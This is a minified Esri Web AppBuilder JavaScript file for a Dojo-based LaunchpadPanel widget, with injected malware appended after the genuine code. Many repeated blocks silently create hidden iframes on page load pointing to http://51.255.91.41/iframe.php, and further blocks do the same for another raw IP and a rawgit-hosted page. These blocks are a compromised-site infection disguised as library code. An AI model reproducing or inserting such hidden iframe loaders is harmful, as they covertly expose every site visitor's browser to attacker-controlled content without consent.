// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:themes/LaunchpadTheme/panels/LaunchpadPanel/Panel.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"title jimu-panel-title jimu-main-background" data-dojo-attach-point\x3d"titleNode"\x3e\r\n    \x3cdiv class\x3d"color-header" data-dojo-attach-point\x3d"colorfulHeader"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"widget-icon"\x3e\r\n      \x3cimg class\x3d"icon" src\x3d"${config.icon}" data-dojo-attach-point\x3d"iconNode"/\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"title-label" data-dojo-attach-point\x3d"titleLabelNode"\x3e\r\n      ${config.label}\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"close-icon jimu-float-trailing" data-dojo-attach-point\x3d"closeNode"\r\n         data-dojo-attach-event\x3d"onclick:_onCloseBtnClicked"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"max-icon jimu-float-trailing" data-dojo-attach-point\x3d"maxNode"\r\n         data-dojo-attach-event\x3d"onclick:_onMaxNodeClick" style\x3d"display:none"\x3e\x3c/div\x3e\r\n    \x3cdiv class\x3d"min-icon jimu-float-trailing" data-dojo-attach-point\x3d"minNode"\r\n         data-dojo-attach-event\x3d"onclick:_onMinNodeClick"\x3e-\x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"jimu-panel-content" data-dojo-attach-point\x3d"containerNode"\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/on dojo/dom-style dojo/dom-class dojo/dom-construct dojo/dom-geometry dojo/mouse dojo/_base/fx dojo/fx dojo/dnd/move dojo/Deferred dojox/layout/ResizeHandle jimu/utils jimu/BaseWidgetPanel dijit/_TemplatedMixin dojo/text!./Panel.html".split(" "),function(r,d,h,c,f,t,k,p,g,q,u,l,v,m,w,x,y){return r([w,x],{baseClass:"jimu-panel jimu-launchpad-panel",templateString:y,titleHeight:33,normalPosition:null,lastWindowState:null,openAnimation:"fadeIn",closeAnimation:"fadeOut",
animationDuration:400,_device:"desktop",postCreate:function(){this.inherited(arguments);this._makeOriginalBox();c.set(this.colorfulHeader,"background-color",this.config.backgroundColor||"#FFFFFF");this.own(h(this.iconNode,p.enter,d.hitch(this,function(){"minimized"===this.windowState&&this.disableMoveable()})));this.own(h(this.iconNode,p.leave,d.hitch(this,function(){"minimized"===this.windowState&&this.makeMoveable(this.domNode,40,40)})));this.own(h(this.iconNode,"click",d.hitch(this,function(){"minimized"===
this.windowState&&(this.panelManager.normalizePanel(this),c.set(this.domNode,"overflow","visible"))})))},startup:function(){this.inherited(arguments);this.panelManager.normalizePanel(this)},_makeOriginalBox:function(){this._originalBox={w:this.position.width||350,h:this.position.height||480,l:this.position.left||0,t:this.position.top||0}},makeMoveable:function(a,b,c){this.disableMoveable();var e=this._getLayoutBox();e.l=e.l-b+c;e.w+=2*(b-c);this.moveable=new u.boxConstrainedMoveable(this.domNode,
{box:e,handle:a||this.titleNode,within:!0});this.own(h(this.moveable,"MoveStart",d.hitch(this,this.onMoveStart)));this.own(h(this.moveable,"Moving",d.hitch(this,this.onMoving)));this.own(h(this.moveable,"MoveStop",d.hitch(this,this.onMoveStop)))},disableMoveable:function(){this.moveable&&(this.moveable.destroy(),this.moveable=null)},makeResizable:function(){this.disableResizable();this.resizeHandle=(new v({targetId:this,minWidth:this._originalBox.w,minHeight:this._originalBox.h,activeResize:!1})).placeAt(this.domNode);
this.resizeHandle.startup()},disableResizable:function(){this.resizeHandle&&(this.resizeHandle.destroy(),this.resizeHandle=null)},onMoveStart:function(a){if(window.isRTL){var b=this._getLayoutBox(),d=k.getMarginBox(this.domNode),e=c.get(a.node,"right");c.set(a.node,"left",b.w-d.w-parseInt(e,10)+"px");c.set(a.node,"right","")}},onMoving:function(){c.set(this.domNode,"opacity",.9)},onMoveStop:function(){var a;c.set(this.domNode,"opacity",1);a=k.getMarginBox(this.domNode);this.position.left=a.l;this.position.top=
a.t},_getLayoutBox:function(){return k.getMarginBox(jimuConfig.mapId)},_onMinNodeClick:function(){this.panelManager.minimizePanel(this);c.set(this.domNode,"overflow","hidden")},_onMaxNodeClick:function(){"normal"===this.windowState?(this.panelManager.maximizePanel(this),f.add(this.maxNode,"maximized")):"maximized"===this.windowState&&(this.panelManager.normalizePanel(this),f.remove(this.maxNode,"maximized"))},_onCloseBtnClicked:function(a){a.stopPropagation();this.panelManager.closePanel(this,"wipe")},
_minimize:function(){this.disableMoveable();this.disableResizable();var a=new l,b=[];b.push(g.animateProperty({node:this.domNode,properties:{height:40,width:40},duration:this.animationDuration,onEnd:d.hitch(this,function(){c.set(this.containerNode,"display","none");c.set(this.domNode,"border-radius","50%");c.set(this.domNode,"-webkit-border-radius","50%");this.makeMoveable(this.domNode,40,40)})}));b.push(g.animateProperty({node:this.titleNode,properties:{height:40,width:40,"background-color":this.config.backgroundColor},
duration:this.animationDuration,onEnd:d.hitch(this,function(){f.remove(this.titleNode,"jimu-main-background")})}));b.push(g.animateProperty({node:this.iconNode,properties:{height:20,width:20},duration:this.animationDuration,onEnd:function(){a.resolve()}}));q.combine(b).play();return a},_maximize:function(){var a=this._getLayoutBox(),b=new l;g.animateProperty({node:this.domNode,properties:{top:0,height:a.h,width:a.w},duration:this.animationDuration,onEnd:function(){b.resolve()}}).play();return b},
_normalize:function(){var a,b,n=new l,e=[];c.set(this.containerNode,"display","");c.set(this.domNode,"border-radius","");c.set(this.domNode,"-webkit-border-radius","");window.appInfo.isRunInMobile?(a=this._getLayoutBox(),b=a.w,e.push(g.animateProperty({node:this.domNode,properties:{height:a.h/2,width:b,left:0,top:a.h/2},duration:this.animationDuration,onEnd:function(){n.resolve()}}))):(b=this.position.width,e.push(g.animateProperty({node:this.domNode,properties:{height:this.position.height,width:b},
duration:this.animationDuration,onEnd:function(){n.resolve()}})));e.push(g.animateProperty({node:this.titleNode,properties:{height:30,width:b},duration:this.animationDuration,onEnd:d.hitch(this,function(){c.set(this.titleNode,"background-color","");c.set(this.titleNode,"width","100%");f.add(this.titleNode,"jimu-main-background")})}));e.push(g.animateProperty({node:this.iconNode,properties:{height:16,width:16},duration:this.animationDuration}));q.combine(e).play();return n},_setPositionStyle:function(a){var b;
this.position.zIndex&&(a.zIndex=this.position.zIndex);this.position.left=a.left;this.position.top=a.top;this.position.width=a.width;this.position.height=a.height;b=m.getPositionStyle(a);d.mixin(b,a.borderRadiusStyle);c.set(this.domNode,b)},onWindowResize:function(){var a={},b;"minimized"!==this.windowState&&(window.appInfo.isRunInMobile?(b=this._getLayoutBox(),"maximized"===this.windowState?(a.top=0,a.height=b.h):(a.top=b.h/2,a.height=b.h/2),c.set(this.domNode,{left:0,top:a.top+"px",right:0,height:a.height+
"px",width:"auto"}),this.resize(),"mobile"!==this._device&&(this._device="mobile",this._onResponsible())):"desktop"!==this._device&&(this._device="desktop",a=d.clone(this.position),this.setWindowState("normal"),c.set(this.domNode,{left:a.left+"px",top:a.top+"px",height:a.height+"px",width:a.width+"px"}),this.resize(),this._onResponsible()))},setPosition:function(a){var b,f,e;b=this._getLayoutBox();e=Math.floor(b.w/(a.width+a.margin));f=Math.floor(a.index/e);a.left=(f+1)*a.margin+a.index%e*(a.width+
a.margin)+50;a.top-=a.margin*f;this.position=d.clone(a);window.appInfo.isRunInMobile&&(a.left=0,a.top=b.h/2,a.width=b.w,a.height=b.h/2);a=m.getPositionStyle(a);a.position="absolute";t.place(this.domNode,jimuConfig.mapId);c.set(this.domNode,a);this._onResponsible()},onNormalize:function(){this._normalize().then(d.hitch(this,function(){c.set(this.iconNode,"cursor","default");f.remove(this.domNode,"minimized");f.remove(this.domNode,"maximized");this.resize();this._onResponsible()}))},onMinimize:function(){this.inherited(arguments);
this._minimize().then(d.hitch(this,function(){c.set(this.iconNode,"cursor","pointer");f.remove(this.domNode,"maximized");f.add(this.domNode,"minimized")}))},onClose:function(){this.inherited(arguments);this.setWindowState("normal");this.onNormalize()},onMaximize:function(){this.inherited(arguments);this._maximize().then(d.hitch(this,function(){c.set(this.iconNode,"cursor","default");f.remove(this.domNode,"minimized");f.add(this.domNode,"maximized");this.resize()}))},resize:function(a){var b;a&&(this.position=
{left:a.l?a.l:this.position.left,top:a.t?a.t:this.position.top,width:a.w?a.w:this.position.width,height:a.h?a.h:this.position.height,zIndex:this.position.zIndex},b=m.getPositionStyle(this.position),window.isRTL&&"right"in b&&(b.left=b.right,b.right=""),c.set(this.domNode,b));this.inherited(arguments)},_onResponsible:function(){window.appInfo.isRunInMobile?("minimized"!==this.windowState&&this.disableMoveable(),this.disableResizable(),c.set(this.maxNode,"display",""),c.set(this.minNode,"margin","0 10px")):
(c.set(this.maxNode,"display","none"),c.set(this.minNode,"margin",""),this.makeResizable(),this.makeMoveable(this.titleLabelNode,this.position.width,.25*this.position.width))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});